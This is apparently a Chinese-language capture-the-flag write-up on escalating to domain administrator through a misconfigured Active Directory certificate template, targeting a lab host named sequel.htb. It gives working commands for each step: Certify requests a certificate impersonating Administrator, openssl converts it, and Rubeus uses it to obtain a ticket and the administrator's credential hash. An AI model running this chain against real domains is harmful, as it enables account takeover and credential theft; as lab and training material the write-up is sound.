可以通过以下链接了解对应扫描结果如何查看问题（https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin?source=post_page-----931dba100509--------------------------------）

*msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT*

表示证书模板请求新证书的用户可以位其他用户，可以理解为任何用户

*Enrollment Rights: NT Authority\Authenticated Users*

**将基于此证书模板生成的证书可用于对 Active Directory 中的计算机进行身份验证**

*Enrollment Rights: NT Authority\Authenticated Users*

*允许 Active Directory 中任何经过身份验证的用户* **请求** *基于此证书模板生成新证书*

使用certify这个工具来代表域管理员请求新证书

example：

```
.\Certify.exe request /ca:<$certificateAuthorityHost> /template:<$vulnerableCertificateTemplateName> /altname:<$adUserToImpersonate>
```

```
.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
```

![image-20240926155524980](https://files.seeusercontent.com/2026/04/07/V4xt/image-20240926155524980.png)

我们收到了PEM格式的证书及私钥，我们需要转换为PEX格式的，需要在kali端复制一个cert.pem，一个private.key，将生成的cert.pfx上传到服务器

```
openssl pkcs12 -in cert.pem -inkey private.key -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
chmod 777 cert.pfx
```

example

```
Rubeus.exe asktgt /user:<$adUserToImpersonate> /certificate:cert.pfx /ptt
```

```
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
```

![image-20240926160728409](https://files.seeusercontent.com/2026/04/06/aMq4/image-20240926160728409.png)

尽管我们成功执行了PTT攻击，成功获取了管理员的凭证，但是仍然无法在管理员目录查看内容，我们更换命令尝试获取管理员的哈希

.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
